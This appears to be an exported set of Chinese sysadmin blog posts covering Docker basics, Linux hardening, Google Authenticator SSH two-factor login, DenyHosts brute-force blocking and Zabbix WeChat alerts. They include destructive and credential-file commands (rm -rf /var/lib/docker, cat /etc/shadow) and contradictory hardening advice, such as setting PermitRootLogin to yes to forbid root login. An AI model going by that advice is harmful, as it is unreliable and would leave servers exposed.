Docker仓库Docker使用类似git的方式管理镜像。通过基本的镜像可以定制创建出来不同种应用的Docker镜像。Docker Hub是Docker官方提供的镜像中心。在这里可以很方便地找到各类应用、环境的镜像。 由于Docker使用联合文件系统，所以镜像就像是夹心饼干一样一层层构成，相同底层的镜像可以共享。所以Docker还是相当节约磁盘空间的。要使用一个镜像，需要先从远程的镜像注册中心拉取，这点非常类似git。 现在，我们来验证 Docker 是否正常工作。第一步，我们需要下载最新的 centos 镜像。 $ docker pull centos 我们很容易就能从Docker Hub镜像注册中心下载一个最新版本的centos镜像到本地。国内网络可能会稍慢，DAOCLOUD提供了Docker Hub的国内加速服务，可以尝试配置使用。 下一步，我们运行下边的命令来查看镜像，确认镜像是否存在： $ sudo docker images centos 这将会输出如下的信息： 123[root@docker opt]# docker images centosREPOSITORY TAG IMAGE ID CREATED SIZEdocker.io/centos latest 05188b417f30 10 days ago 196.8 MB 运行一个容器使用Docker最关键的一步就是从镜像创建容器。有两种方式可以创建一个容器：使用docker create命令创建容器，或者使用docker run命令运行一个新容器。两个命令并没有太大差别，只是前者创建后并不会立即启动容器。 以centos为例，我们启动一个新容器，并将centos的Shell作为入口：运行简单的脚本来测试镜像： $ sudo docker run -i -t centos /bin/bash 这时候我们成功创建了一个centos的容器，并将当前终端连接为这个centos的bash shell。这时候就可以愉快地使用centos的相关命令了~可以快速体验一下。 参数 -i表示这是一个交互容器，会把当前标准输入重定向到容器的标准输入中，而不是终止程序运行。-t指为这个容器分配一个终端。 如果正常运行，你将会获得一个简单的 bash 提示，输入 exit 来退出 或者按Ctrl+D可以退出这个容器了。 在容器运行期间，我们可以通过docker ps命令看到所有当前正在运行的容器。添加-a参数可以看到所有创建的容器： $ docker ps -a 这将会输出如下的信息： [root@docker opt]# docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 28e833d4a45f centos &quot;/bin/bash&quot; 2 minutes ago Exited (130) About a minute ago sad_shaw 这里显示的一些东西: CONTAINER ID: 容器的ID IMAGE: 容器所使用的镜像 COMMAND: 建立容器时候使用的命令 CREATED: 创建时间 STATUS: 当前状态 PORTS: 端口映射(默认为无) NAMES: 容器的名字 输出信息详解：每个容器都有一个唯一的ID标识，通过ID可以对这个容器进行管理和操作。在创建容器时，我们可以通过–name参数指定一个容器名称，如果没有指定系统将会分配一个，就像这里的“sad_shaw”（什么鬼）。 当我们按Ctrl+D退出容器时，命令执行完了，所以容器也就退出了。要重新启动这个容器，可以使用docker start命令： $ docker start -i sad_shaw 同样，-i参数表示需要交互式支持。 注意：每次执行docker run命令都会创建新的容器，建议一次创建后，使用docker start/stop来启动和停用容器。 卸载 Docker卸载软件包1$ sudo apt-get purge docker-engine 卸载依赖包1sudo apt-get autoremove --purge docker-engine 如有必要，执行以下命令，删除全部镜像、容器、数据卷和其他docker相关用户信息1$ rm -rf /var/lib/docker","raw":null,"content":null,"categories":[{"name":"Docker","slug":"Docker","permalink":"http://blog.yangcvo.me/categories/Docker/"}],"tags":[{"name":"Virtualization-Docker","slug":"Virtualization-Docker","permalink":"http://blog.yangcvo.me/tags/Virtualization-Docker/"}]},{"title":"Docker学习(一)：简介","slug":"容器-虚拟化/Docker/Docker学习(一)：简介","date":"2016-07-12T07:25:31.000Z","updated":"2017-03-23T14:17:43.000Z","comments":true,"path":"2016/07/12/容器-虚拟化/Docker/Docker学习(一)：简介/","link":"","permalink":"http://blog.yangcvo.me/2016/07/12/容器-虚拟化/Docker/Docker学习(一)：简介/","excerpt":"","text":"##Docker入门简介的个人理解： 在大型的互联网已大部分在使用docker容器，主要是因为对单个应用的确提供了非常方便。迁移环境扩容部署只需要几分钟就可以做到上百台上千台。 理解分几点： 1234567891011121314151.Docker虚拟化对比：跟传统的虚拟化对比 XEN或KVM区别。因为XEN和KVM这些传统方式则是在硬件的基础上，虚拟出自己的系统，在系统上班部署相关的APP应用。而容器docker是在这些虚拟机或者操作系统层面实现虚拟化，直接复用本地主机的操作系统，实现快速部署相同的应用。这个在云加速云领域用的比较多。2.传统虚拟化方案，和Docker虚拟化方案对比：传统虚拟化：都是基于管理软件，去创建多一级别的虚拟机。Docker虚拟化：直接把应用当一个容器，不需要调用本机系统。3.Docker虚拟化有三个概念：分别镜像，容器，仓库。（1）镜像：docker镜像其实就是模板，跟我们ISO镜像很相似，刻录了一套应用部署到其他机器上面运行。（2）容器：使用镜像常用应用或者系统，比如：tomcat，nginx,Apache等等应用就是称之为容器。（3）仓位：仓位是放镜像的地方。分公开的仓库，和私有的仓库。 ##Docker特点 跟传统VM比较具有如下优点： 123451）操作启动快运行的性能可以获得极大的提升，管理操作（启动，停止，开启，关闭，重启等等）都是以秒或者毫秒计算为单位。2)轻量级虚拟化就是好比拥有足够的”操作系统“仅需要添加减少镜像即可，在一台服务器可以部署100~1000个容器，但是传统的虚拟化10到20台就不错了。3）开源免费的。低成本。 跟传统KVM-vm比较缺点： 1234在我接触中，刚刚开始维护自动化运维云加速就有使用到docker，去单独跑一个应用，用Python脚本写的。现在对比目前知道的人比较少，用在每个行业也比较少。相关资料也比较欠缺。GO语言还不是特别成熟 上面是我对Docker个人的理解，下面我也贴出我学习Docker的文档。 这里开始学习docker 是看docker官网文章写的特别详细。 下面是我官网一些介绍： Docker是什么 Docker是一种容器技术，它可以将应用和环境等进行打包，形成一个独立的，类似于iOS的APP形式的“应用”，这个应用可以直接被分发到任意一个支持Docker的环境中，通过简单的命令即可启动运行。Docker是一种最流行的容器化实现方案。和虚拟化技术类似，它极大的方便了应用服务的部署；又与虚拟化技术不同，它以一种更轻量的方式实现了应用服务的打包。使用Docker可以让每个应用彼此相互隔离，在同一台机器上同时运行多个应用，不过他们彼此之间共享同一个操作系统。Docker的优势在于，它可以在更细的粒度上进行资源的管理，也比虚拟化技术更加节约资源。 Docker 提供了一个可以运行你的应用程序的封套(envelope)，或者说容器。它原本是 dotCloud 启动的一个业余项目，并在前些时候开源了。它吸引了大量的关注和讨论，导致 dotCloud 把它重命名到 Docker Inc。它最初是用 Go 语言编写的，它就相当于是加在 LXC（LinuX Containers，linux 容器）上的管道，允许开发者在更高层次的概念上工作。 Docker 扩展了 Linux 容器（Linux Containers），或着说 LXC，通过一个高层次的 API 为进程单独提供了一个轻量级的虚拟环境。Docker 利用了 LXC， cgroups 和 Linux 自己的内核。和传统的虚拟机不同的是，一个 Docker 容器并不包含一个单独的操作系统，而是基于已有的基础设施中操作系统提供的功能来运行的。 Docker能做什么？Docker可以解决虚拟机能够解决的问题，同时也能够解决虚拟机由于资源要求过高而无法解决的问题。Docker能处理的事情包括： 隔离应用依赖 创建应用镜像并进行复制 创建容易分发的即启即用的应用 允许实例简单、快速地扩展 测试应用并随后销毁它们 Docker背后的想法是创建软件程序可移植的轻量容器，让其可以在任何安装了Docker的机器上运行，而不用关心底层操作系统，就像野心勃勃的造船者们成功创建了集装箱而不需要考虑装在哪种船舶上一样。 基本概念开始试验Docker之前，我们先来了解一下Docker的几个基本概念： 12345671. 虚拟化技术依赖物理CPU和内存，是硬件级别的；而docker构建在操作系统上，利用操作系统的containerization技术，所以docker甚至可以在虚拟机上运行。2. 虚拟化系统一般都是指操作系统镜像，比较复杂，称为“系统”；而docker开源而且轻量，称为“容器”，单个容器适合部署少量应用，比如部署一个redis、一个memcached。3. 传统的虚拟化技术使用快照来保存状态；而docker在保存状态上不仅更为轻便和低成本，而且引入了类似源代码管理机制，将容器的快照历史版本一一记录，切换成本很低。4. 传统的虚拟化技术在构建系统的时候较为复杂，需要大量的人力；而docker可以通过Dockfile来构建整个容器，重启和构建速度很快。更重要的是Dockfile可以手动编写，这样应用程序开发人员可以通过发布Dockfile来指导系统环境和依赖，这样对于持续交付十分有利。5. Dockerfile可以基于已经构建好的容器镜像，创建新容器。Dockerfile可以通过社区分享和下载，有利于该技术的推广。6. Docker 会像一个可移植的容器引擎那样工作。它把应用程序及所有程序的依赖环境打包到一个虚拟容器中，这个虚拟容器可以运行在任何一种 Linux 服务器上。这大大地提高了程序运行的灵活性和可移植性，无论需不需要许可、是在公共云还是私密云、是不是裸机环境等等。7. Docker也是一个云计算平台，它利用Linux的LXC、AUFU、Go语言、cgroup实现了资源的独立，可以很轻松的实现文件、资源、网络等隔离，其最终的目标是实现类似PaaS平台的应用隔离。 Docker 由下面这些组成1231. Docker 服务器守护程序（server daemon），用于管理所有的容器。2. Docker 命令行客户端，用于控制服务器守护程序。3. Docker 镜像：查找和浏览 docker 容器镜像。 镜像：我们可以理解为一个预配置的系统光盘，这个光盘插入电脑后就可以启动一个操作系统。当然由于是光盘，所以你无法修改它或者保存数据，每次重启都是一个原样全新的系统。Docker里面镜像基本上和这个差不多。 容器：同样一个镜像，我们可以同时启动运行多个，运行期间的产生的这个实例就是容器。把容器内的操作和启动它的镜像进行合并，就可以产生一个新的镜像。 开始Docker基于LXC技术实现，依赖于Linux内核，所以Docker目前只能在Linux以原生方式运行。目前主要的Linux发行版在他们的软件仓库中内置了Docker： 12345678910Ubuntu:Ubuntu Trusty 14.04 (LTS)Ubuntu Precise 12.04 (LTS)Ubuntu Saucy 13.10 Mac:Mac OS X 大于等于 10.8 \"Snow Leopard\" 才可以安装 Docker Toolbox。CentOS:CentOS 7 容器现在这里都说容器了。你可以从镜像中创建容器，这等同于从快照中创建虚拟机，不过更轻量。应用是由容器运行的。容器与虚拟机一样，是隔离的（有一点要注意，我稍后会讨论到）。它们也拥有一个唯一ID和唯一的供人阅读的名字。容器对外公开服务是必要的，因此Docker允许公开容器的特定端口。这里画了图举了个例子： 容器是设计来运行一个应用的，而非一台机器。你可能会把容器当虚拟机用，但如我们所见，你将失去很多的灵活性，因为Docker提供了用于分离应用与数据的工具，使得你可以快捷地更新运行中的代码/系统，而不影响数据。 数据卷数据卷让你可以不受容器生命周期影响进行数据持久化。它们表现为容器内的空间，但实际保存在容器之外，从而允许你在不影响数据的情况下销毁、重建、修改、丢弃容器。Docker允许你定义应用部分和数据部分，并提供工具让你可以将它们分开。使用Docker时必须做出的最大思维变化之一就是：容器应该是短暂和一次性的。 卷是针对容器的，你可以使用同一个镜像创建多个容器并定义不同的卷。卷保存在运行Docker的宿主文件系统上，你可以指定卷存放的目录，或让Docker保存在默认位置。保存在其他类型文件系统上的都不是一个卷，稍后再具体说。 阅读卷的文章：docker数据卷 参考资料 深入理解Docker Volume http://dockone.io/article/128 WordPress https://registry.hub.docker.com/_/wordpress/ Docker学习——镜像导出 http://www.sxt.cn/u/756/blog/5339 Dockerfile Reference https://docs.docker.com/reference/builder/ 关于Dockerfile http://blog.tankywoo.com/docker/2014/05/08/docker-2-dockerfile.htmlDocker的基本结构：","raw":null,"content":null,"categories":[{"name":"Docker","slug":"Docker","permalink":"http://blog.yangcvo.me/categories/Docker/"}],"tags":[{"name":"Virtualization-Docker","slug":"Virtualization-Docker","permalink":"http://blog.yangcvo.me/tags/Virtualization-Docker/"}]},{"title":"生产环境-Linux系统安全统一配置","slug":"运维安全/生产环境-Linux系统安全设置","date":"2016-06-29T04:07:27.000Z","updated":"2017-04-12T13:58:26.000Z","comments":true,"path":"2016/06/29/运维安全/生产环境-Linux系统安全设置/","link":"","permalink":"http://blog.yangcvo.me/2016/06/29/运维安全/生产环境-Linux系统安全设置/","excerpt":"","text":"今天整理下Linux系统在生产环境安全几点： 12345678910111201) 生产环境统一不要用root，统一添加普通用户，管理员操作通过sudo授权管理。02）更改默认的远程连接SSH服务端口及禁止root用户远程连接，这里关闭外围IP使用22端口，写防火墙规则，然后禁用root，这样统一使用普通用户统一管理。03）定时自动服务器时间，写到计划任务里面，如果机房管理服务器，最好搭建台NTP时间同步服务器。04）配置yum更新源，从国内更新源下载安装rpm包。05）关闭selinux 开启防火墙一定要熟悉配置防火墙规则。06）调整文件描述的数量，进程及文件的打开都会消耗文件描述符。07）定时自动服务的日志，定时自动清理/var/spool/clientmqueue/目录垃圾文件。防止inodes节点被占满。08）精准开机启动服务（crond,sshd,network,rsyslog）09) linux内核参数优化/etc/sysctl.conf 执行sysctl -p 生效。10）更改字符集，支持中文。11） 锁定关键系统文件。 chattr +i /etc/passwd /etc/shadow /etc/group /etc/gshahow /etc/inittab 1、帐号安全 12345678910111213141.1 锁定系统中的自建帐号查看帐号：#cat /etc/passwd#cat /etc/shadow查看账户、口令文件，与系统管理员确认不必要的账号。对于一些保留的系统伪帐户如：bin, sys，adm，uucp，lp, nuucp，hpdb, www, daemon等可根据需要锁定登陆。在修改之前先备份一下，省的出问题：备份方法：#cp -p /etc/passwd /etc/passwd_bak#cp -p /etc/shadow /etc/shadow_bak加固方法：使用命令passwd -l &lt;用户名&gt;锁定不必要的账号。使用命令passwd -u &lt;用户名&gt;解锁需要恢复的账号。风险：需要与管理员确认此项操作不会影响到业务系统的登录 1.2设置系统口令策略 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051 查看密码策略设置：cat /etc/login.defs|grep PASS 修改之前先备份一下： cp -p /etc/login.defs /etc/login.defs_bak 修改配置文件：vi /etc/login.defs 文件内参数解释： PASS_MAX_DAYS 90 #新建用户的密码最长使用天数 PASS_MIN_DAYS 0 #新建用户的密码最短使用天数 PASS_WARN_AGE 7 #新建用户的密码到期提前提醒天数 PASS_MIN_LEN 0 #最小密码长度0 PASS_MAX_LEN 9 #最大密码长度9``` 1.3禁用root之外的超级用户 ```bash查看口令文件：cat /etc/passwd属性解释：login_name：用户名password：加密后的用户密码user_ID：用户ID，(1 ~ 6000) 若用户ID=0，则该用户拥有超级用户的权限。查看此处是否有多个ID=0。group_ID：用户组IDcomment：用户全名或其它注释信息home_dir：用户根目录command：用户登录后的执行命令加固方法与1.1的加固方法一样！``` 1.4 限制能够su为root的用户```bash 修改 /etc/pam.d/su 文件 先备份：cp -p /etc/pam.d/su /etc/pam.d/su_bak 在头部添加：auth required /lib/security/pam_wheel.so group=wheel #只有wheel组的可以su 将test用户加入wheel组：usermod -G wheel test 排错方法：当系统验证出现问题时，首先应当检查/var/log/messages或者/var/log/secure中的输出信息，根据这些信息判断用户账号的有效性。如果是因为PAM验证故障，而引起root也无法登录，只能使用single user或者rescue模式进行排错。``` 2、最小化服务2.1 停止或禁用与承载业务无关的服务```bash 查看当前init级别 who -r 或者 runlevel 查看所有服务的状态 chkconfig –list 设置服务在个init级别下开机是否启动 chkconfig –level &lt;服务名&gt; on|off|reset 注意：要安装chkconfig，radhat上面自带的有！``` 3、数据访问控制```bash 修改umask的值 改变新建文件的安全属性 备份：cp -p /etc/profile /etc/profile_bak 修改umask=027 作用：通过设置umask值，可以为新创建的文件和目录设置缺省权限 风险：会修改新建文件的默认权限，如果该服务器是WEB应用，则此项谨慎修改。 具体解释：请百度。。。。 4、网络访问控制4.1 使用SSH进行管理 123456789101112查看服务是否开启： ps -aef|grep sshd开启服务：service sshd start关闭服务：service sshd stop重启服务：service sshd restart``` 4.2设置访问控制策略限制能够管理本机的IP地址 ```bash 先备份文件：cp -p /etc/ssh/sshd_config /etc/ssh/sshd_config_bak修改文件：添加：AllowUsers *@10.138.*.* #仅允许10.138.0.0/16网段所有用户通过ssh访问保存后，重启ssh。 4.3 禁止root用户远程使用ssh 12修改文件/etc/ssh/sshd_config 将PermitRootLogin修改为yes记得修改之前要备份 4.4 限定信任主机 12345修改/etc/hosts.allow，添加一下代码：sshd:192.168.0.100:allow //允许IP 192.168.0.100 登录sshd:192.168.10.:allow //允许IP 192.168.10. 网段登录修改/etc/hosts.deny，添加一下代码sshd:all:deny //禁止其他的所有IP登录 4.5防止误使用Ctrl+Alt+Del重启系统 12修改/etc/init/control-alt-delete.conf 文件，将最后一行：exec /sbin/shutdown -r now “Control-Alt-Delete pressed” 注释掉就可以了 5、用户鉴别5.1设置帐户锁定登录失败锁定次数、锁定时间 12345修改文件/etc/pam.d/system-auth 添加一行：auth required pam_tally.so onerr=fail deny=6 unlock_time=300#设置为密码连续错误6次锁定，锁定时间300秒用户锁定后，解锁：faillog -u &lt;用户名&gt; -r风险：需要PAM包的支持;对pam文件的修改应仔细检查，一旦出现错误会导致无法登陆; 当系统验证出现问题时，首先应当检查/var/log/messages或者/var/log/secure中的输出信息，根据这些信息判断用户账号的有效性。 5.2 修改帐户TMOUT值，设置自动注销时间 123456789101112修改/etc/profile文件在”HISTFILESIZE=”后面加入下面这行，添加：TMOUT=600 #表示无操作600秒后自动退出``` 5.3设置Bash保留历史命令的条数修改/etc/profile文件的HISTSIZE的值，自己设定6、审计策略6.1 配置系统日志策略配置文件 ```bash 查看syslog是否启动：ps -aef | grep syslog查看rsyslogd的配置，并确认日志文件是否存在：cat /etc/rsyslog.conf 6.2审计产生的数据分配合理的存储空间和存储时间查看系统轮询配置：cat /etc/logrotate.conf一些属性: 12rotate 4 日志文件保存个数为4，当第5个产生后，删除最早的日志size 100k 每个日志的大小 7.1 Linux修改/etc/motd文件，威慑入侵者1.）删除/etc/redhat_release 建议修改名字，如果贸然一些软件可能无法安装。mv /etc/redhat_release /etc/新名字2.）编辑/etc/issue #建议修改里面的关键字3.）编写/etc/motd #公告栏，如果有非授权用户闯入，可以给予文字警告，国外有因为这个事情打官司的，原因是进去提示Welcome呵呵列出以下范文： 123456***Wrrning***Without the owner's prior written consent, no decompiling or reverse-engineering shall be allowed*Notice:This is a private communication system.Unauthorized access or use may lead to prosecution.","raw":null,"content":null,"categories":[{"name":"运维安全","slug":"运维安全","permalink":"http://blog.yangcvo.me/categories/运维安全/"}],"tags":[{"name":"Operation safety","slug":"Operation-safety","permalink":"http://blog.yangcvo.me/tags/Operation-safety/"}]},{"title":"安全的SSH与CentOS的7谷歌身份验证双因素身份验证","slug":"运维安全/安全的SSH与CentOS的7谷歌身份验证双因素身份验证","date":"2016-06-29T04:07:27.000Z","updated":"2017-03-14T05:54:04.000Z","comments":true,"path":"2016/06/29/运维安全/安全的SSH与CentOS的7谷歌身份验证双因素身份验证/","link":"","permalink":"http://blog.yangcvo.me/2016/06/29/运维安全/安全的SSH与CentOS的7谷歌身份验证双因素身份验证/","excerpt":"","text":"安装谷歌身份验证 什么是谷歌身份验证官方github详细介绍 概述谷歌身份验证项目包括一次性密码生成器为多个移动平台上的实现，以及一个可插拔的身份验证模块（PAM）整个的一次性密码是基于服务器和设备与谷歌，验证程序的时间安装在同步之中。在设备和服务器然后会知道什么一次性代码是正确的，在30秒内，然后它会改变。 SSH访问始终是关键，你可能要想方设法提高你的SSH访问的安全性。在这篇文章中，我们将看到我们如何可以通过使用谷歌的Authenticator保护与简单的双因素身份验证的SSH。在使用它之前，你必须与谷歌身份验证一次性密码协议TOTP服务器上的SSH守护整合，另一个限制是，你必须有你的Andr​​oid手机与你所有的时间，或者至少你想SSH访问的时间。这是教程为CentOS 7编写的。 首先，我们将通过在外壳执行以下命令来安装开源的谷歌身份验证PAM模块。 1yum install google-authenticator 安装这步如果提示有没有可用的软件包google-authenticator尝试安装EPEL repo (for CentOS 6 &amp; 7): Centos 7是不会提示这个错误的，6的话会提示这个错误。下面是6的安装方法。 1234 # cd /tmp # wget http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm # wget http://rpms.famillecollet.com/enterprise/remi-release-6.rpm # rpm -Uvh remi-release-6*.rpm epel-release-6*.rpm Then verify the EPEL repo exists: 1234yum repolist ... epel Extra Packages for Enterprise Linux 6 - x86_64 ... Finally, install Google Authenticator: 1yum --enablerepo=epel install google-authenticator 现在，我们需要配置PAM身份验证的SSH 1vim /etc/pam.d/sshd 该文件更改为这一点 -基本上加入“身份验证所需的pam_google_authenticator.so”行 1auth required pam_google_authenticator.so 接下来，现在，我们需要编辑ssh守护进程的配置文件（如果你愿意，你也可以做到这一点从的​​Virtualmin） 1vim /etc/ssh/sshd_config 加以下行的文件中，如果它已经放置，然后将参数更改为“yes”： 1ChallengeResponseAuthentication yes 重新启动SSH服务 1service sshd restart 然后运行服务器运行在谷歌的认证： 此命令将在您安装谷歌认证的Centos 7服务器。下一个步骤是获得的验证码。这是一个非常简单的命令，只需回答服务器的简单的问题，他会问你要获取验证码，并暂存码。为此，您可以一步运行以下命令： 1google-authenticator 记得重启ssh服务。 在您的浏览器，加载的URL上面提到的; 它会显示一个QRCode的，你可以扫描到您的手机采用了谷歌身份验证器应用程序的Andr​​oid，iPhone或黑莓。如果你已经有一个谷歌身份验证令牌被您的手机上生成的，您可以添加一个新的，它会显示他们。苹果手机推荐软件：google authenticator 、authy 、洋葱 Android的可以到我github上面下载：（Google 身份证认证器） 123456启动appon您的手机：在您的手机中选择基于时间的对于考虑使用SSH使用户帐户： 根用户名@nginx重点：就是key值两种添加方法。 验证测试：如果一切工作正常，你应该能够通过SSH使用用户名，然后验证码从您的手机/设备，登陆需要先登陆服务器密码，然后在加动态密码即可。 报错error如果提示找不到这个包需要翻墙或者VPN才能下载： 1234wget https://google-authenticator.googlecode.com/files/libpam-google-authenticator-1.0-source.tar.bz2 tar -xvzf libpam-google-authenticator-1.0-source.tar.bz2 cd libpam-google-authenticator-1.0 make make install 这里我已经下载好安装包了，你可以下载下来编译安装。 共享资料 英文安装文档&amp;google-authenticator包：我github上面有安装包也上传了。github 还有什么报错参考链接：google_authenticator 注意事项 提示一点阿里云上面服务器是安装不上的。因为我都在两个系统6 &amp; 7版本试过了。 Selinux：需设定为disabled 可与rsa公私钥认证一起使用，但只差别在与电脑里有没有rsa key而已，如果没有的话才会用到。 同一个『.google_authenticator』可用在别台Server上，所以在安全性上仍须注意。 商用OTP系统一般是C/S网路版方式，有一个统一的Authentication Server，为了保证高可用性， 一般会有一主一备两台伺服器。 Google Authenticator是一个基于时间的产生验证码的程式，因此不管是伺服器端还是手机用户端， 对时间的要求都是非常严格的，要时刻保持与NTP伺服器同步。 Google Authenticator和条型码扫瞄器默认是不会产生任何GPRS和WIFI流量的。 如果不需要使用者登入时输入OTP密码，而是在使用者su到root时要求输入， 可以把PAM认证语句加入到『/etc/pam.d/su』中。 当伺服器启用PAM认证之后，所有使用者都是要求输入TOTP密码， 所以需要每个使用者在自己的目录下产生一个『.google_authenticator』档案。","raw":null,"content":null,"categories":[{"name":"运维安全","slug":"运维安全","permalink":"http://blog.yangcvo.me/categories/运维安全/"}],"tags":[{"name":"Operation safety","slug":"Operation-safety","permalink":"http://blog.yangcvo.me/tags/Operation-safety/"}]},{"title":"化解自己的阿里云服务器被黑客攻击-暴力破解","slug":"运维安全/ 化解自己的阿里云服务器被黑客攻击-暴力破解","date":"2016-06-29T04:07:27.000Z","updated":"2017-04-12T13:44:13.000Z","comments":true,"path":"2016/06/29/运维安全/ 化解自己的阿里云服务器被黑客攻击-暴力破解/","link":"","permalink":"http://blog.yangcvo.me/2016/06/29/运维安全/ 化解自己的阿里云服务器被黑客攻击-暴力破解/","excerpt":"","text":"说明下：因为阿里云服务器我是用来自己搭建blog 的做了一些简单的监控。 因为防止被攻击瘫痪，做到安全防范，可是今天晚上吃完饭，发现又被人攻击，是印度和巴西IP地址暴力破解方式一直在尝试破解我密码。 1还好我在阿里云上面使用了云盾告警，其实它这个一般般，只能提醒，不能有效阻止黑客攻击。 收到告警以后，马上打开电脑去云盾上面查看下。 然后看了以后发现问题不大，可是上机器查看，发现有不断的攻击痕迹。日志查看到很多来历不明的IP。德国🇩🇪 巴西 印度。 看到这个，我就写了个脚本记录被攻击留下的保存指定文件夹，我看下是否还在继续攻击了。 123456789101112131415161718 #!/bin/bash#Denyhosts SHELL SCRIPT#2016-2-18cat /var/log/secure|awk '/Failed/&#123;print $(NF- 3)&#125;'|sort|uniq -c|awk '&#123;print $2\"=\" $1;&#125;' &gt;/root/bin/Denyhosts.txtDEFINE=\"10\"for i in `cat /root/bin/Denyhosts.txt`do IP=`echo $i|awk -F= '&#123;print $1&#125;'` NUM=`echo $i|awk -F= '&#123;print $2&#125;'` if [ $NUM -gt $DEFINE ] then grep $IP /etc/hosts.deny &gt;/dev/null if [ $? -gt 0 ]; then echo \"sshd:$IP\" &gt;&gt; /etc/hosts.deny fi fidone 因为保存到其他的txt文件下面： 1234[root@iZ28by3xm9eZ bin]# ll总用量 4-rwxr-xr-x 1 root root 535 2月 17 21:38 Denyhosts.sh-rw-r--r-- 1 root root 0 2月 17 21:45 Denyhosts.txt 查看里面有不断攻击的IP : 123456789[root@iZ28by3xm9eZ bin]# vim Denyhosts.txt101.69.252.146=1115.196.20.181=11117.243.176.226=6186.208.19.61=5186.251.118.71=389.238.64.148=294.215.141.101=1 这里我记录了攻击的多少次也有的。 可是发现的确在继续攻击，我在想如何阻止被破解呢。 主要是依靠denyhost软件。稳重所讲的是下载安装包安装，实际上可以从直接使用yum或者apt安装，找到相应的源就可以。下边是帖子原文： DenyHosts官方网站为：http://denyhosts.sourceforge.net 这里下载最新的版本是2008年 2.6 版本的 一直没更新。不过已经足够强大。 1. 安装 123# tar -zxvf DenyHosts-2.6.tar.gz# cd DenyHosts-2.6# python setup.py install 默认是安装到/usr/share/denyhosts目录的。 1.配置 1234567891011121314151617181920212223# cd /usr/share/denyhosts/# cp denyhosts.cfg-dist denyhosts.cfg# vi denyhosts.cfgPURGE_DENY = 50m #过多久后清除已阻止IPHOSTS_DENY = /etc/hosts.deny #将阻止IP写入到hosts.denyBLOCK_SERVICE = sshd #阻止服务名DENY_THRESHOLD_INVALID = 1 #允许无效用户登录失败的次数DENY_THRESHOLD_VALID = 10 #允许普通用户登录失败的次数DENY_THRESHOLD_ROOT = 5 #允许root登录失败的次数WORK_DIR = /usr/local/share/denyhosts/data#将deny的host或ip纪录到Work_dirDENY_THRESHOLD_RESTRICTED = 1 #设定 deny host 写入到该资料夹LOCK_FILE = /var/lock/subsys/denyhosts #将DenyHOts启动的pid纪录到LOCK_FILE中，已确保服务正确启动，防止同时启动多个服务。HOSTNAME_LOOKUP=NO #是否做域名反解 ADMIN_EMAIL = #设置管理员邮件地址DAEMON_LOG = /var/log/denyhosts #自己的日志文件DAEMON_PURGE = 10m #该项与PURGE_DENY 设置成一样，也是清除hosts.deniedssh 用户的时间。 2.设置启动脚本 123# cp daemon-control-dist daemon-control# chown root daemon-control# chmod 700 daemon-control 完了之后执行daemon-contron start就可以了。 1# ./daemon-control start 如果要使DenyHosts每次重起后自动启动还需做如下设置： 123# ln -s /usr/share/denyhosts/daemon-control /etc/init.d/denyhosts# chkconfig --add denyhosts# chkconfig denyhosts on 然后就可以启动了： 1# service denyhosts start 可以看看/etc/hosts.deny内是否有禁止的IP，有的话说明已经成功了。 启动出现错误解决： 1./daemon-control start 出现：starting DenyHosts: /usr/bin/env python /usr/bin/denyhosts.py --daemon --config=/usr/share/denyhosts/denyhosts.cfg DenyHosts could not obtain lock (pid: ) [Errno 17] File exists: &#39;/var/lock/subsys/denyhosts&#39; 使用： 1234567 touch /private/var/log/system.log touch /var/lock/subsys/denyhostsrm -f /var/lock/subsys/denyhosts./daemon-control startstarting DenyHosts: /usr/bin/env python /usr/bin/denyhosts.py –daemon –config=/usr/share/denyhosts/denyhosts.cfg OK！ 启动完成啦。 你可以使用 1service denyhosts status来查看运行状态 DenyHosts is running with pid = 25874 表示已经启动起来了。接下来就可以使用 1cat /etc/hosts.deny来查看记录了 然后启动成功以后，我自己测试了下， 1234567ssh root@115.28.175.207root@115.28.175.207's password:Permission denied, please try again.root@115.28.175.207's password:cPermission denied, please try again.root@115.28.175.207's password:Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password). 发现自己登陆不上去了，然后只能去阿里控制台操作查看原因。 原来发现 cat /etc/hosts.deny来查看记录了 然后去掉，115IP 发现就可以登陆了。 所以我做的设置是root尝试破解4次以上，被锁定。","raw":null,"content":null,"categories":[{"name":"运维安全","slug":"运维安全","permalink":"http://blog.yangcvo.me/categories/运维安全/"}],"tags":[{"name":"Operation safety","slug":"Operation-safety","permalink":"http://blog.yangcvo.me/tags/Operation-safety/"}]},{"title":"zabbix3.0实现微信报警","slug":"性能监控/Zabbix/zabbix3-0实现微信报警","date":"2016-06-22T07:36:53.000Z","updated":"2016-12-15T10:34:32.000Z","comments":true,"path":"2016/06/22/性能监控/Zabbix/zabbix3-0实现微信报警/","link":"","permalink":"http://blog.yangcvo.me/2016/06/22/性能监控/Zabbix/zabbix3-0实现微信报警/","excerpt":"","text":"前言： 因为我已经在测试环境和·生产环境·都实现了微信和邮件告警。今天有空就写了篇文档后期可以在复习下，现实生产环境中，我们通常使用邮件和短信接受zabbix报警信息，但是邮件经常被工作人员搁置在角落中甚至被设置为垃圾邮件被过滤掉。公司的短信接口又太贵，复杂环境中使用短息报警会使运维成本增加很多。微信提供了很好的第三方接口，我们可以利用微信报警以求降低运维成本。 这里我现在公司也用第三方的电话短信猫做告警，严重的故障会用短信来发送到指定的运维人员。这样即使微信和邮件都没有打开收到，短信和电话会第一时间通知。 微信告警的好处：第一：可以及时通知时间通知运维人员。及时的解决故障。 第二：下班周末课余时间可以准时接收到。 安装与配置：微信的第三方接口要求我们先申请一个企业号——传送门：微信企业公众号平台 第一步：申请微信公众号 这里跟微信绑定后期登陆只需要扫描下二维码就可以了。 如何申请也可参考这篇文档：申请微信公众号 如何操作企业号？1.通讯录添加企业成员 我们要提前把成员信息添加进组织部门，必填项+手机号或者微信号，这样别人扫描二维码的时候才能成功关注企业号。注意：这里有两个我们要用到信息，一个组织部门的ID，一个部门成员的账号（账号是自己手动指定的，不同于微信号，最好是字母加数字） 2.应用中心创建应用 我们要在这里创建应用，因为要通过应用发送消息给部门成员 注意：这里要记住一个值，应用ID 3.给部门设置管理员 设置---&gt;功能设置----&gt;权限管理----&gt;新建管理组 管理员必须事先已经关注了企业号，并且已经设置好邮箱地址 确定管理员可以读取通讯录，可以使用应用发消息。 注意：我们需要管理员的CorpID和Secret 我们要准备这些东西： 一个微信企业号 企业号已经被部门成员关注 企业号里有一个可以发消息的应用 